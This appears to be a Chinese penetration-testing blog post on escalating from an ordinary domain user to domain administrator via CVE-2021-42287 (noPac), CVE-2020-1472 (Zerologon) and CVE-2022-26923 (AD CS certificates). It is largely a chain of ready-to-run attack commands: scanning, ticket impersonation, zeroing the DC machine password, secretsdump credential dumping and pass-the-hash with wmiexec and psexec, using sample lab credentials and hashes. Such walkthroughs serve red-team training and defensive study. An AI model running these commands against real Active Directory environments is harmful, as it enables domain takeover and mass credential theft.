---
title: 横向移动-域控提权
date: '2023-07-20T10:00:00+08:00'
draft: false
description: 由于Active Directory没有对域中计算机和服务器账号进行验证，经过身份验证的攻击者利用该漏洞绕过完全限制，可将域中普通用户权限提升为域管理员权限并执行任意代码。
summary: 由于Active Directory没有对域中计算机和服务器账号进行验证，经过身份验证的攻击者利用该漏洞绕过完全限制，可将域中普通用户权限提升为域管理员权限并执行任意代码。
categories:
- 技术好文
tags:
- 技术实践
- 漏洞研究
keywords:
- 技术实践
- 漏洞研究
- 技术好文
- BlueDog
---
## CVE-2021-42287

由于Active Directory没有对域中计算机和服务器账号进行验证，经过身份验证的攻击者利用该漏洞绕过完全限制，可将域中普通用户权限提升为域管理员权限并执行任意代码。

### 利用条件

前提条件：一个域内普通账号 影响版本：Windows基本全系列

### 漏洞复现

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909740.jpeg)当前场景如下，目前已经获得了Web Server的主机权限和webadmin这个域成员的账号和密码，来使用CVE-2021-42287漏洞来攻击域控主机 这里我们可以使用nopac脚本来进行利用 在攻击前先将该域名和IP地址绑定在hosts中![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909248.jpeg)

检测是否存在漏洞

```
noPac.exe scan -domain god.org -user webadmin -pass admin!@#45
```

漏洞存在，接下来我们使用域普通用户的TGT，利用漏洞请求TGS申请域控机器账户 cifs服务的ST凭证

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200918831.jpeg)

```
noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org --impersonate administrator -dump -use-ldap
```

生成票据后我们再来查看一下当前电脑上所存在的票据

```
klist 
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200918901.jpeg)

发现有一条和域控建立的票据，这里我们直接使用psexec连接即可

```
PsExec \\owa2010cn-god.god.org cmd
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919322.jpeg)

## CVE-2020-1472

CVE-2020-1472是一个windows域控中最严重的远程权限提升漏洞，攻击者通过NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限

首先先获取域控的计算机名

```
net group "domain controllers" /domain
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919858.jpeg)然后使用测试脚本去检测该域控是否存在漏洞

```
python zerologon_tester.py owa2010cn-god 192.168.3.21
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919072.jpeg)

然后使用exp连接DC清空凭证

```python
python cve-2020-1472-exploit.py OWA2010CN-GOG 192.168.3.21
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919113.jpeg)

执行后，会将DC的密码置空，然后我们再使用空密码连接将域内的HASH导出出来

```bash
secretsdump.exe "god.org/owa2010cn-god$@192.168.3.21" -no-pass
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919581.jpeg)

这时我们在使用域控的hash去进行PTH连接，拿到域控权限

```
wmiexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/admin
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909833.jpeg)

## CVE-2022-26923

该漏洞允许低权限用户在安装了Active Directory证书服务（AD CS）服务器角色的默认Active Directory环境中将权限提升为域管理员。现在已经很少没有安装AD CS的大中型Active Directory环境，所以该漏洞危害和利用性都较强。

### 利用条件

前提条件：

1. 域内普通账号
2. 域内存在证书服务器

影响版本：win8.1、win10、win11、Windows Server 2012 R2、Windows Server2016、Windows Server2019、Windows Server2022等版本

### 环境搭建

首先准备一台已搭建域服务的主机，这里选择Windows Server 2012R2版本。因为这个漏洞基于证书服务，所以需要DC中安装Active Directory证书服务。点击添加角色和功能，默认下一步直到下图，选择安装Active Directory证书服务：![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909841.jpeg)下一步到角色服务中，勾选证书颁发机构、证书颁发机构web注册、证书注册策略Web服务![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909843.jpeg)点击安装即可![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909997.jpeg)

安装完成后需要配置Active Directory证书服务，在服务器管理器中单击该选项。![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919055.jpeg)选择刚刚安装时所勾选的三个服务后默认下一步到CA名称中![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909158.jpeg)配置CA证书后，下一步到服务器证书![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909247.jpeg)在服务器证书中，选择证书并稍后为SSL分配，点击下一步![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909765.jpeg)下一步配置![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909307.jpeg)查看是否配置成功：在证书颁发机构中查看是否存在证书模板![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200919344.jpeg)该漏洞的利用条件为获得一个域内普通用户权限，所以需要在DC上创建一个用户，之后便会使用这个用户的凭据进行域控提权操作。![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909420.jpeg)

### 漏洞利用

#### 获取CA名称

目前我们的已知信息

```
域控Win 2012
    IP：192.168.45.152
    主机名：DC-2012
域名：tidesec.local
用户：test/Pass123
```

接下来第一步我们需要获取该域内的CA名称

1. 任意域内主机查询

```
 查看是否存在证书驱动器
Get-PSDrive cert | ft -AutoSize

 列出本地机器账户的证书
Get-ChildItem Cert:\LocalMachine\Root
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909908.jpeg)

1. 域控上查询

```
certutil
certutil -config - -ping
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909061.jpeg)![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909344.jpeg)3. 合理猜测 根据域控主机名和域名进行猜测

```
域控主机名：DC-2012
域名：tidesec.local
CA名称：tidesec-DC-2012-CA
```

#### 申请证书

在申请证书前，需要先修改一下我们攻击机的hosts文件，将域名和ip地址对应一下

```bash
vim /etc/hosts
192.168.45.152 tidesec.local
192.168.45.152 tidesec-DC-2012-CA
192.168.45.152 DC-2012.tidesec.local
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909814.jpeg)这里需要使用到certipy工具，在使用前先进行安装

```python
python3 setup.py install
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909295.jpeg)安装后使用我们刚刚所获得的低权限用户、CA名、域控计算机名来生成一个证书

```
certipy req tidesec.local'test:Pass123'@DC-2012.tidesec.local -ca tidesec-DC-2012-CA -template User
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200920119.jpeg)申请ceshi用户证书账号成功后，执行命令来验证该证书，获取其NT hash值

```bash
certipy auth -pfx test.pfx
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200920773.jpeg)成功获取到了NT hash，说明测试环境没有问题，接下来需要使用bloodyAD来新建一个机器账号 在新建账号前我们先观察一下，当前域控下的Computers下是没有账号的，![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909846.jpeg)接下来新建一个

```python
 python3 bloodyAD.py -d tidesec.local -u test -p 'Pass123' --host 192.168.45.152 addComputer test2 'Test12345' 
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909831.jpeg)这时再来观察下域控中成功添加了一个test2的机器账户，![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909120.jpeg)接下来设置其dNSHostName 属性为域控服务器属性

```python
python3 bloodyAD.py -d tidesec.local -u test -p 'Pass123' --host 192.168.45.152 setAttribute 'CN=test2,CN=Computers,DC=tidesec,DC=local' dNSHostName '["DC-2012.tidesec.local"]'
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909231.jpeg)![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909074.jpeg)接下来我们再用刚新建的机器账号test2去申请证书，其实是申请的域控DC$的证书

```bash
certipy req 'tidesec.local/test2$:Test12345@192.168.45.152' -template Machine -dc-ip 192.168.45.152 -ca tidesec-DC-2021-CA
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909564.jpeg)可以看到此时的证书不是test.pfx，是主机名dc-2012.pfx，颁发的是域控制器的计算机账户证书，。接下来我们使用该证书进行认证，Certipy工具检索到了DC-2012$的NTLM hash。

```bash
certipy auth -pfx dc-2012.pfx -dc-ip 192.168.45.152
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909311.jpeg)然后我们可以使用impacket工具包中的secretsdump.py脚本来执行DCSync攻击，导出域内用户Hash

```python
python3 secretsdump.py 'tidesec.local/DC-2012$@DC-2012.tidesec.local' -hashes :20d4bd2f70725811f4e39fe77166e00b
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909480.jpeg)之后在使用wmiexec.py脚本去获得域控账户的执行权限

```python
python3 wmiexec.py tidesec.local/administrator@192.168.45.152 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7
```

![图片](https://raw.githubusercontent.com/B1ueD0g/Picture/main/img/202307200909493.jpeg)
